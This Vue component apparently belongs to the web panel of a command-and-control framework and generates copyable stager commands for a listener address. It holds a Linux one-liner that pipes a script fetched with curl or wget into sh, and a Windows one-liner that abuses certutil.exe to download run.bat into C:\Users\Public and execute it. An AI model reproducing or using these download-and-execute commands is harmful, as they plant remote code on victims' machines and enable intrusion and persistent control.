<script setup lang="ts">
import type { ListenerRecord } from '#/api';

import { computed, ref } from 'vue';

import { VbenButton } from '@vben/common-ui';
import { IconifyIcon } from '@vben/icons';
import { ElMessage } from 'element-plus';

import { $t } from '#/locales';

defineOptions({ name: 'ListenerCommandDrawer' });

const connectAddr = ref('');

const linuxCommand = computed(() => {
  const addr = connectAddr.value;
  if (!addr) {
    return '';
  }
  return `(curl -fsSL -m180 http://${addr}/slt||wget -T180 -q http://${addr}/slt)|sh`;
});

const windowsCommand = computed(() => {
  const addr = connectAddr.value;
  if (!addr) {
    return '';
  }
  return `certutil.exe -urlcache -split -f http://${addr}/swt C:\\Users\\Public\\run.bat && C:\\Users\\Public\\run.bat`;
});

async function copyCommand(command: string) {
  if (!command) {
    return;
  }

  try {
    await navigator.clipboard.writeText(command);
    ElMessage.success($t('page.listener.messages.copySuccess'));
  } catch {
    ElMessage.error($t('page.listener.messages.copyError'));
  }
}

function setListener(record: ListenerRecord) {
  connectAddr.value = record.ConnectAddr || '';
}

defineExpose({
  setListener,
});
</script>

<template>
  <div class="listener-command-drawer">
    <section class="command-section">
      <div class="command-header">
        <h3 class="command-title">{{ $t('page.listener.commandDrawer.linux') }}</h3>
        <VbenButton size="sm" variant="outline" @click="copyCommand(linuxCommand)">
          <IconifyIcon icon="ant-design:copy-outlined" />
          <span>{{ $t('page.listener.commandDrawer.copy') }}</span>
        </VbenButton>
      </div>
      <pre class="command-block"><code>{{ linuxCommand }}</code></pre>
    </section>

    <section class="command-section">
      <div class="command-header">
        <h3 class="command-title">{{ $t('page.listener.commandDrawer.windows') }}</h3>
        <VbenButton size="sm" variant="outline" @click="copyCommand(windowsCommand)">
          <IconifyIcon icon="ant-design:copy-outlined" />
          <span>{{ $t('page.listener.commandDrawer.copy') }}</span>
        </VbenButton>
      </div>
      <pre class="command-block"><code>{{ windowsCommand }}</code></pre>
    </section>
  </div>
</template>

<style scoped>
.listener-command-drawer {
  display: flex;
  flex-direction: column;
  gap: 28px;
  padding: 6px 8px 12px;
}

.command-section {
  display: flex;
  flex-direction: column;
  gap: 12px;
}

.command-header {
  display: flex;
  align-items: center;
  justify-content: space-between;
  gap: 12px;
}

.command-title {
  margin: 0;
  font-size: 16px;
  font-weight: 700;
  line-height: 1.5;
  color: var(--el-text-color-primary);
}

.command-block {
  overflow-x: auto;
  margin: 0;
  padding: 14px 16px;
  color: #dbeafe;
  background: rgb(59 130 246 / 14%);
  border: 1px solid rgb(59 130 246 / 20%);
  border-radius: 8px;
  font-size: 13px;
  line-height: 1.7;
  white-space: pre-wrap;
  word-break: break-all;
}

.command-block code {
  font-family: Consolas, 'SFMono-Regular', 'Liberation Mono', Menlo, monospace;
}
</style>
